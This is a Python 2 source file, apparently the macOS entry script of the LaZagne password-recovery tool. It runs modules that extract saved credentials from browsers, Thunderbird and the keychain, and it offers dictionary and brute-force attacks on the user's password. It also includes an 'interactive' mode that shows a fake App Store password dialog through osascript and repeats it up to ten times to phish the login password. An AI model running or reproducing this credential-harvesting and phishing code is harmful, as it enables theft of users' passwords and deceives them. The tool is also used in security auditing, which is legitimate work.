#!/usr/bin/python

##############################################################################
#                                                                            #
#                           By Alessandro ZANNI                              #
#                                                                            #
##############################################################################

# Disclaimer: Do Not Use this program for illegal purposes ;)

from lazagne.softwares.browsers.mozilla import Mozilla
from lazagne.softwares.browsers.chrome import Chrome
import subprocess
import traceback
import argparse
import logging
import getpass
import time
import json
import sys
import os

# Configuration
from lazagne.config.write_output import parseJsonResultToBuffer, print_debug, StandartOutput
from lazagne.config.manageModules import get_categories, get_modules
from lazagne.config.constant import *

# object used to manage the output / write functions (cf write_output file)
constant.st = StandartOutput()

category 	= get_categories()
moduleNames = get_modules()

# Tab containing all passwords
stdoutRes = []

# Define a dictionary for all modules
modules = {}
for categoryName in category:
	modules[categoryName] = {}

# Add all modules to the dictionary
for module in moduleNames:
	modules[module.category][module.options['dest']] = module
modules['mails']['thunderbird'] = Mozilla(True) # For thunderbird (firefox and thunderbird use the same class)

def output():
	if args['write_normal']:
		constant.output = 'txt'
	
	if args['write_json']:
		constant.output = 'json'

	if args['write_all']:
		constant.output = 'all'

	if constant.output:	
		if constant.output != 'json':
			constant.st.write_header()

	# Remove all unecessary variables
	del args['write_normal']
	del args['write_json']
	del args['write_all']

def verbosity():
	# Write on the console + debug file
	if args['verbose'] == 0: 	level=logging.CRITICAL
	elif args['verbose'] == 1:	level=logging.INFO
	elif args['verbose'] >= 2: 	level=logging.DEBUG
	
	FORMAT 		= "%(message)s"
	formatter 	= logging.Formatter(fmt=FORMAT)
	stream 		= logging.StreamHandler()
	stream.setFormatter(formatter)
	
	root = logging.getLogger()
	root.setLevel(level)
	# If other logging are set
	for r in root.handlers:
		r.setLevel(logging.CRITICAL)
	root.addHandler(stream)
	del args['verbose']


def run_cmd(cmd):
	p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	result, _ = p.communicate()
	if result:
		return result
	else:
		return ''

def manage_advanced_options():

	if 'password' in args:
		constant.user_password = args['password']

	if 'attack' in args:
		constant.dictionary_attack = args['attack']

	# File used for dictionary attacks
	if 'path' in args:
		constant.path = args['path']
	if 'bruteforce' in args: 
		constant.bruteforce = args['bruteforce']

	# Mozilla advanced options
	if 'manually' in args:
		constant.manually = args['manually']
	if 'specific_path' in args:
		constant.specific_path = args['specific_path']
	
	if 'mails' in args['auditType']:
		constant.mozilla_software = 'Thunderbird'
	elif 'browsers' in args['auditType']:
		constant.mozilla_software = 'Firefox'

def launch_module(module):
	ok = False
	modulesToLaunch = []
	try:
		# Launch only a specific module
		for i in args:
			if args[i] and i in b:
				modulesToLaunch.append(i)
	except:
		# if no args
		pass

	# Launch all modules
	if not modulesToLaunch:
		modulesToLaunch = module

	for i in modulesToLaunch:
		try:
			constant.st.title_info(i.capitalize()) 					# print title
			pwdFound = module[i].run(i.capitalize())				# run the module
			constant.st.print_output(i.capitalize(), pwdFound) 		# print the results

			# return value - not used but needed 
			yield True, i.capitalize(), pwdFound
		except:
			traceback.print_exc()
			print
			error_message = traceback.format_exc()
			yield False, i.capitalize(), error_message

# write output to file (json and txt files)
def write_in_file(result):
	if constant.output == 'json' or constant.output == 'all':
		try:
			# Human readable Json format
			prettyJson = json.dumps(result, sort_keys=True, indent=4, separators=(',', ': '))
			with open(os.path.join(constant.folder_name, constant.file_name_results + '.json'), 'a+b') as f:
				f.write(prettyJson.decode('unicode-escape').encode('UTF-8'))
			constant.st.do_print('[+] File written: ' + constant.folder_name + os.sep + constant.file_name_results + '.json')
		except Exception as e:
			print_debug('ERROR', 'Error writing the output file: %s' % e)

	if constant.output == 'txt' or constant.output == 'all':
		try:
			with open(os.path.join(constant.folder_name, constant.file_name_results + '.txt'), 'a+b') as f:
				a = parseJsonResultToBuffer(result)
				f.write(a.encode("UTF-8"))
			constant.st.write_footer()
			constant.st.do_print('[+] File written: ' + constant.folder_name + os.sep + constant.file_name_results + '.txt')
		except Exception as e:
			print_debug('ERROR', 'Error writing the output file: %s' % e)

# Run module
def runModule(category_choosed, need_high_privileges=False, need_system_privileges=False, not_need_to_be_in_env=False, cannot_be_impersonate_using_tokens=False):
	global category

	if category_choosed != 'all':
		category = [category_choosed]

	for categoryName in category:
		for r in launch_module(modules[categoryName]):
			yield r

# print user when verbose mode is enabled (without verbose mode the user is printed on the write_output python file)
def print_user(user):
	if logging.getLogger().isEnabledFor(logging.INFO) == True:
		constant.st.print_user(user)


def get_safe_storage_key(key):
	try:
		for passwords in constant.keychains_pwds:
			if key in passwords['Service']:
				return passwords['Password']
	except:
		pass

	return False
	
def runLaZagne(category_choosed='all', interactive=False):
	user = getpass.getuser()
	constant.finalResults = {}
	constant.finalResults['User'] = user

	# could be easily changed
	application = 'App Store'
	
	i = 0
	while True:
		# run all modules
		for r in runModule(category_choosed):
			yield r

		# execute once if not interactive, otherwise print the dialog box many times until the user keychain is unlocked (which means that the user passwod has been found) 
		if not interactive or (interactive and constant.user_keychain_find):
			break
		
		elif interactive and constant.user_keychain_find == False:
			msg = ''
			if i == 0: 
				msg = 'App Store requires your password to continue.'
			else:
				msg = 'Password incorrect! Please try again.'

			# code inspired from: https://github.com/fuzzynop/FiveOnceInYourLife
			cmd = 'osascript -e \'tell app "{application}" to activate\' -e \'tell app "{application}" to activate\' -e \'tell app "{application}" to display dialog "{msg}" & return & return  default answer "" with icon 1 with hidden answer with title "{application} Alert"\''.format(application=application, msg=msg)
			pwd = run_cmd(cmd)
			if pwd.split(':')[1].startswith('OK'):
				constant.user_password = pwd.split(':')[2].strip()
		
		i += 1

		# if the user enter 10 bad password, be nice with him and break the loop
		if i > 10:
			break

	# if keychains has been decrypted, launch again some module
	chrome_key = get_safe_storage_key('Chrome Safe Storage')
	if chrome_key:
		for r in launch_module({'chrome': Chrome(safe_storage_key=chrome_key)}):
			yield r

	stdoutRes.append(constant.finalResults)

if __name__ == '__main__':

	parser = argparse.ArgumentParser(description=constant.st.banner, formatter_class=argparse.RawTextHelpFormatter)
	parser.add_argument('--version', action='version', version='Version ' + str(constant.CURRENT_VERSION), help='laZagne version')

	# ------------------------------------------- Permanent options -------------------------------------------
	# Version and verbosity 
	PPoptional = argparse.ArgumentParser(add_help=False,formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
	PPoptional._optionals.title = 'optional arguments'
	PPoptional.add_argument('-i', '--interactive', default=False, action='store_true', help='will prompt a window to the user')
	PPoptional.add_argument('-password', dest='password', action='store', help='user password used to decrypt the keychain')
	PPoptional.add_argument('-attack', dest='attack', action='store_true', help='500 well known passwords used to check the user hash (could take a while)')
	PPoptional.add_argument('-path', dest='path', action='store', help='path of a file used for dictionary file')
	PPoptional.add_argument('-b', dest='bruteforce', action='store', help='number of character to brute force')
	PPoptional.add_argument('-v', dest='verbose', action='count', default=0, help='increase verbosity level')

	# Output 
	PWrite = argparse.ArgumentParser(add_help=False,formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
	PWrite._optionals.title = 'Output'
	PWrite.add_argument('-oN', dest='write_normal',  action='store_true', help = 'output file in a readable format')
	PWrite.add_argument('-oJ', dest='write_json',  action='store_true', help = 'output file in a json format')
	PWrite.add_argument('-oA', dest='write_all',  action='store_true', help = 'output file in all format')

	# ------------------------------------------- Add options and suboptions to all modules -------------------------------------------
	all_subparser = []
	for c in category:
		category[c]['parser'] = argparse.ArgumentParser(add_help=False,formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
		category[c]['parser']._optionals.title = category[c]['help']
		
		# Manage options
		category[c]['subparser'] = []
		for module in modules[c]:
			m = modules[c][module]
			category[c]['parser'].add_argument(m.options['command'], action=m.options['action'], dest=m.options['dest'], help=m.options['help'])
			
			# Manage all suboptions by modules
			if m.suboptions and m.name != 'thunderbird':
				tmp = []
				for sub in m.suboptions:
					tmp_subparser = argparse.ArgumentParser(add_help=False,formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
					tmp_subparser._optionals.title = sub['title']
					if 'type' in sub:
						tmp_subparser.add_argument(sub['command'], type=sub['type'], action=sub['action'], dest=sub['dest'], help=sub['help'])
					else:
						tmp_subparser.add_argument(sub['command'], action=sub['action'], dest=sub['dest'], help=sub['help'])
					tmp.append(tmp_subparser)
					all_subparser.append(tmp_subparser)
				category[c]['subparser'] += tmp

	# ------------------------------------------- Print all -------------------------------------------
	parents = [PPoptional] + all_subparser + [PWrite]
	dic = {'all':{'parents':parents, 'help':'Run all modules', 'func': runModule}}
	for c in category:
		parser_tab = [PPoptional, category[c]['parser']]
		if 'subparser' in category[c]:
			if category[c]['subparser']:
				parser_tab += category[c]['subparser']
		parser_tab += [PWrite]
		dic_tmp = {c: {'parents': parser_tab, 'help':'Run %s module' % c, 'func': runModule}}
		dic = dict(dic.items() + dic_tmp.items())

	#2- Main commands
	subparsers = parser.add_subparsers(help='Choose a main command')
	for d in dic:
		subparsers.add_parser(d,parents=dic[d]['parents'],help=dic[d]['help']).set_defaults(func=dic[d]['func'],auditType=d)

	# ------------------------------------------- Parse arguments -------------------------------------------
	args = dict(parser.parse_args()._get_kwargs())
	arguments = parser.parse_args()
	category_choosed = args['auditType']
	
	# Define constant variables
	output()
	verbosity()
	manage_advanced_options()

	# Print the title
	constant.st.first_title()

	start_time = time.time()

	for r in runLaZagne(category_choosed, arguments.interactive):
		pass

	write_in_file(stdoutRes)

	elapsed_time = time.time() - start_time
	print '\nelapsed time = ' + str(elapsed_time)
